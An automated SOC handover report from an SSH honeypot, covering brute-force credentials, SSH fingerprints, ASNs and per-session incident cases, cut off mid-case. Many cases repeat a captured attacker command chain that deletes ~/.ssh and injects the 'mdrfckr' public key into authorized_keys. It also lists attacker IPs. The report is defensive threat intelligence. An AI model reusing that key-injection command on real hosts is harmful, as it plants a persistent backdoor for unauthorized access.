# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-06-04 |
| **Generated At** | 2026-06-04T12:52:27Z |
| **Shift Time** | 12:52 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **242** |
| Confirmed Threats | **202** |
| False Positives Filtered | **40** (16.5%) |
| Unique Attacker IPs | **26** |
| Countries of Origin | **16** |
| High Severity Cases | **64** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **178** |
| Malware Samples Analyzed | **0** HIGH · **20** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **163** |
| Unique Credential Pairs | **104** |
| Unique Usernames | **65** |
| Unique Passwords | **92** |
| Successful Auth Pairs | **39** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 65 |
| `345gs5662d34` | 30 |
| `ubuntu` | 3 |
| `deploy` | 2 |
| `testuser` | 2 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 31 |
| `345gs5662d34` | 30 |
| `123456` | 9 |
| `1234` | 3 |
| `12345678` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 31 |
| `345gs5662d34` | `345gs5662d34` | 30 |
| `abomb` | `abomb` | 1 |
| `root` | `201314` | 1 |
| `root` | `Zhang@123` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `201314` | `103.143.12.163` | 2026-06-04T10:03:35 |
| `root` | `3245gs5662d34` | `103.143.12.163` | 2026-06-04T10:03:38 |
| `root` | `Zhang@123` | `103.143.12.163` | 2026-06-04T10:05:51 |
| `root` | `Mima@2024` | `103.143.12.163` | 2026-06-04T10:08:07 |
| `root` | `123_asdf` | `179.102.26.14` | 2026-06-04T10:11:42 |
| `root` | `3245gs5662d34` | `179.102.26.14` | 2026-06-04T10:11:49 |
| `root` | `passwort` | `45.119.84.196` | 2026-06-04T10:14:00 |
| `root` | `3245gs5662d34` | `45.119.84.196` | 2026-06-04T10:14:10 |
| `root` | `Aa!123456` | `45.119.84.196` | 2026-06-04T10:16:17 |
| `root` | `P@ssw0rd00` | `179.102.26.14` | 2026-06-04T10:17:04 |
| `root` | ` ` | `103.146.202.84` | 2026-06-04T10:18:18 |
| `root` | `Ll123456789` | `103.143.12.163` | 2026-06-04T10:19:34 |
| `root` | `A123456a` | `179.102.26.14` | 2026-06-04T10:19:51 |
| `root` | `Tx123456` | `103.143.12.163` | 2026-06-04T10:21:45 |
| `root` | `newpassword` | `179.102.26.14` | 2026-06-04T10:22:25 |
| `root` | `Spider123` | `103.143.12.163` | 2026-06-04T10:24:01 |
| `root` | `14531453` | `179.102.26.14` | 2026-06-04T10:30:02 |
| `root` | `1122334455` | `179.102.26.14` | 2026-06-04T10:32:44 |
| `root` | `123qwe321` | `179.102.26.14` | 2026-06-04T10:35:19 |
| `root` | `vicidial1` | `103.143.12.163` | 2026-06-04T10:37:40 |
| `root` | `ubuntu@2024` | `179.102.26.14` | 2026-06-04T10:38:00 |
| `root` | `ZAQ!2wsxCDE#` | `179.102.26.14` | 2026-06-04T10:40:34 |
| `root` | `asdf;lkj` | `179.102.26.14` | 2026-06-04T10:48:25 |
| `root` | `123456@123456` | `179.102.26.14` | 2026-06-04T11:04:00 |
| `root` | `kevin` | `179.102.26.14` | 2026-06-04T11:09:10 |
| `root` | `Zg@123456` | `179.102.26.14` | 2026-06-04T11:17:09 |
| `root` | `admin` | `59.27.249.238` | 2026-06-04T11:18:18 |
| `root` | `1234@abcd` | `179.102.26.14` | 2026-06-04T11:19:40 |
| `root` | `123qwe,.` | `179.102.26.14` | 2026-06-04T11:24:56 |
| `root` | `P@$$w0rd1234` | `101.126.54.66` | 2026-06-04T11:52:07 |
| `root` | `3245gs5662d34` | `101.126.54.66` | 2026-06-04T11:52:11 |
| `root` | `vps@2024` | `43.173.249.11` | 2026-06-04T12:03:31 |
| `root` | `3245gs5662d34` | `43.173.249.11` | 2026-06-04T12:03:34 |
| `root` | `zxcvbnm@123` | `43.173.249.11` | 2026-06-04T12:10:01 |
| `root` | `Asdfghjkl;'` | `43.173.249.11` | 2026-06-04T12:16:22 |
| `root` | `@qwer2025` | `51.195.109.79` | 2026-06-04T12:20:13 |
| `root` | `3245gs5662d34` | `51.195.109.79` | 2026-06-04T12:20:16 |
| `root` | `ready2go` | `43.173.249.11` | 2026-06-04T12:35:47 |
| `root` | `abc123456.` | `43.173.249.11` | 2026-06-04T12:40:20 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **242** |
| Sessions with Fingerprint | **8** |
| Unique HASSH Fingerprints | **8** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 167 |
| Go SSH scanner | 2 |
| Unknown | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 78 | 6 |
| `03a80b21afa8...` | Modern SSH client | 62 | 2 |
| `af8223ac9914...` | libssh-based | 20 | 1 |
| `f45fb203c310...` | Mirai/variant | 2 | 2 |
| `4e066189c3bb...` | Generic scanner | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 78 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 62 | 2 | Modern SSH client |
| `af8223ac9914...` | libssh | 20 | 1 | libssh-based |
| `95420f9d932d...` | libssh | 5 | 3 | — |
| `f45fb203c310...` | libssh | 2 | 2 | Mirai/variant |
| `4e066189c3bb...` | Go SSH scanner | 1 | 1 | Generic scanner |
| `dd9bcf093c35...` | Unknown | 1 | 1 | Mirai/variant |
| `873a5fb5fedc...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **1** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 31 | 6 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `45.119.84.196`, `101.126.54.66`, `51.195.109.79`, `179.102.26.14`, `43.173.249.11`, `103.143.12.163`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **26** |
| Unique ASNs | **25** |
| High-Risk ASNs | **17** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS396982` | Google LLC | 1 | LOW |
| `AS4766` | Korea Telecom | 1 | HIGH |
| `AS56089` | OFFRATEL | 1 | MEDIUM |
| `AS11845` | Vox Telecom Ltd | 1 | LOW |
| `AS131386` | Long Van System Solution JSC | 1 | HIGH |
| `AS26599` | TELEFÔNICA BRASIL S.A | 1 | HIGH |
| `AS205275` | ROMARG SRL | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (64)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-a3a303c81332

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:03 |
| **Last Seen** | 2026-06-04 10:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:03:35` | `cowrie.session.connect` |
| `2026-06-04 10:03:35` | `cowrie.client.version` |
| `2026-06-04 10:03:35` | `cowrie.client.kex` |
| `2026-06-04 10:03:35` | `cowrie.login.success` |
| `2026-06-04 10:03:36` | `cowrie.session.params` |
| `2026-06-04 10:03:36` | `cowrie.command.input` |
| `2026-06-04 10:03:36` | `cowrie.command.failed` |
| `2026-06-04 10:03:36` | `cowrie.log.closed` |
| `2026-06-04 10:03:36` | `cowrie.session.params` |
| `2026-06-04 10:03:36` | `cowrie.command.input` |
| `2026-06-04 10:03:36` | `cowrie.session.file_download` |
| `2026-06-04 10:03:36` | `cowrie.log.closed` |
| `2026-06-04 10:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a81a01e909a2

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:03 |
| **Last Seen** | 2026-06-04 10:03 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:03:38` | `cowrie.session.connect` |
| `2026-06-04 10:03:38` | `cowrie.client.version` |
| `2026-06-04 10:03:38` | `cowrie.client.kex` |
| `2026-06-04 10:03:38` | `cowrie.login.success` |
| `2026-06-04 10:03:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7680d44a9917

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:05 |
| **Last Seen** | 2026-06-04 10:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:05:51` | `cowrie.session.connect` |
| `2026-06-04 10:05:51` | `cowrie.client.version` |
| `2026-06-04 10:05:51` | `cowrie.client.kex` |
| `2026-06-04 10:05:51` | `cowrie.login.success` |
| `2026-06-04 10:05:51` | `cowrie.session.params` |
| `2026-06-04 10:05:51` | `cowrie.command.input` |
| `2026-06-04 10:05:51` | `cowrie.command.failed` |
| `2026-06-04 10:05:52` | `cowrie.log.closed` |
| `2026-06-04 10:05:52` | `cowrie.session.params` |
| `2026-06-04 10:05:52` | `cowrie.command.input` |
| `2026-06-04 10:05:52` | `cowrie.session.file_download` |
| `2026-06-04 10:05:52` | `cowrie.log.closed` |
| `2026-06-04 10:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a056e33d8f0

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:05 |
| **Last Seen** | 2026-06-04 10:05 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:05:53` | `cowrie.session.connect` |
| `2026-06-04 10:05:53` | `cowrie.client.version` |
| `2026-06-04 10:05:53` | `cowrie.client.kex` |
| `2026-06-04 10:05:54` | `cowrie.login.success` |
| `2026-06-04 10:05:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-79bc1f964a30

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:08 |
| **Last Seen** | 2026-06-04 10:08 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:08:06` | `cowrie.session.connect` |
| `2026-06-04 10:08:06` | `cowrie.client.version` |
| `2026-06-04 10:08:06` | `cowrie.client.kex` |
| `2026-06-04 10:08:07` | `cowrie.login.success` |
| `2026-06-04 10:08:07` | `cowrie.session.params` |
| `2026-06-04 10:08:07` | `cowrie.command.input` |
| `2026-06-04 10:08:07` | `cowrie.command.failed` |
| `2026-06-04 10:08:07` | `cowrie.log.closed` |
| `2026-06-04 10:08:07` | `cowrie.session.params` |
| `2026-06-04 10:08:07` | `cowrie.command.input` |
| `2026-06-04 10:08:07` | `cowrie.session.file_download` |
| `2026-06-04 10:08:07` | `cowrie.log.closed` |
| `2026-06-04 10:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7b4db080f6f3

| Field | Detail |
|---|---|
| **Source IP** | `103.143.12[.]163` |
| **First Seen** | 2026-06-04 10:08 |
| **Last Seen** | 2026-06-04 10:08 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:08:09` | `cowrie.session.connect` |
| `2026-06-04 10:08:09` | `cowrie.client.version` |
| `2026-06-04 10:08:09` | `cowrie.client.kex` |
| `2026-06-04 10:08:09` | `cowrie.login.success` |
| `2026-06-04 10:08:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.143.12[.]163` to AbuseIPDB if not already reported
- [ ] Block `103.143.12[.]163` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-359f0a9f233f

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:11 |
| **Last Seen** | 2026-06-04 10:11 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:11:40` | `cowrie.session.connect` |
| `2026-06-04 10:11:40` | `cowrie.client.version` |
| `2026-06-04 10:11:40` | `cowrie.client.kex` |
| `2026-06-04 10:11:42` | `cowrie.login.success` |
| `2026-06-04 10:11:43` | `cowrie.session.params` |
| `2026-06-04 10:11:43` | `cowrie.command.input` |
| `2026-06-04 10:11:43` | `cowrie.command.failed` |
| `2026-06-04 10:11:43` | `cowrie.log.closed` |
| `2026-06-04 10:11:44` | `cowrie.session.params` |
| `2026-06-04 10:11:44` | `cowrie.command.input` |
| `2026-06-04 10:11:44` | `cowrie.session.file_download` |
| `2026-06-04 10:11:44` | `cowrie.log.closed` |
| `2026-06-04 10:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f21d963ee77e

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
| **First Seen** | 2026-06-04 10:11 |
| **Last Seen** | 2026-06-04 10:11 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:11:48` | `cowrie.session.connect` |
| `2026-06-04 10:11:48` | `cowrie.client.version` |
| `2026-06-04 10:11:48` | `cowrie.client.kex` |
| `2026-06-04 10:11:49` | `cowrie.login.success` |
| `2026-06-04 10:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `179.102.26[.]14` to AbuseIPDB if not already reported
- [ ] Block `179.102.26[.]14` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68cf0bd9f957

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 10:14 |
| **Last Seen** | 2026-06-04 10:14 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:14:00` | `cowrie.session.connect` |
| `2026-06-04 10:14:00` | `cowrie.client.version` |
| `2026-06-04 10:14:00` | `cowrie.client.kex` |
| `2026-06-04 10:14:00` | `cowrie.login.success` |
| `2026-06-04 10:14:00` | `cowrie.session.params` |
| `2026-06-04 10:14:00` | `cowrie.command.input` |
| `2026-06-04 10:14:00` | `cowrie.command.failed` |
| `2026-06-04 10:14:01` | `cowrie.log.closed` |
| `2026-06-04 10:14:01` | `cowrie.session.params` |
| `2026-06-04 10:14:01` | `cowrie.command.input` |
| `2026-06-04 10:14:01` | `cowrie.session.file_download` |
| `2026-06-04 10:14:01` | `cowrie.log.closed` |
| `2026-06-04 10:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-781af21598ed

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 10:14 |
| **Last Seen** | 2026-06-04 10:14 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:14:09` | `cowrie.session.connect` |
| `2026-06-04 10:14:09` | `cowrie.client.version` |
| `2026-06-04 10:14:09` | `cowrie.client.kex` |
| `2026-06-04 10:14:10` | `cowrie.login.success` |
| `2026-06-04 10:14:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9e5e5367156b

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 10:16 |
| **Last Seen** | 2026-06-04 10:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:16:16` | `cowrie.session.connect` |
| `2026-06-04 10:16:16` | `cowrie.client.version` |
| `2026-06-04 10:16:16` | `cowrie.client.kex` |
| `2026-06-04 10:16:17` | `cowrie.login.success` |
| `2026-06-04 10:16:17` | `cowrie.session.params` |
| `2026-06-04 10:16:17` | `cowrie.command.input` |
| `2026-06-04 10:16:17` | `cowrie.command.failed` |
| `2026-06-04 10:16:17` | `cowrie.log.closed` |
| `2026-06-04 10:16:17` | `cowrie.session.params` |
| `2026-06-04 10:16:17` | `cowrie.command.input` |
| `2026-06-04 10:16:18` | `cowrie.session.file_download` |
| `2026-06-04 10:16:18` | `cowrie.log.closed` |
| `2026-06-04 10:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-24ce6d191ac5

| Field | Detail |
|---|---|
| **Source IP** | `45.119.84[.]196` |
| **First Seen** | 2026-06-04 10:16 |
| **Last Seen** | 2026-06-04 10:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-04 10:16:20` | `cowrie.session.connect` |
| `2026-06-04 10:16:20` | `cowrie.client.version` |
| `2026-06-04 10:16:20` | `cowrie.client.kex` |
| `2026-06-04 10:16:20` | `cowrie.login.success` |
| `2026-06-04 10:16:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.119.84[.]196` to AbuseIPDB if not already reported
- [ ] Block `45.119.84[.]196` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0b25642e361

| Field | Detail |
|---|---|
| **Source IP** | `179.102.26[.]14` |
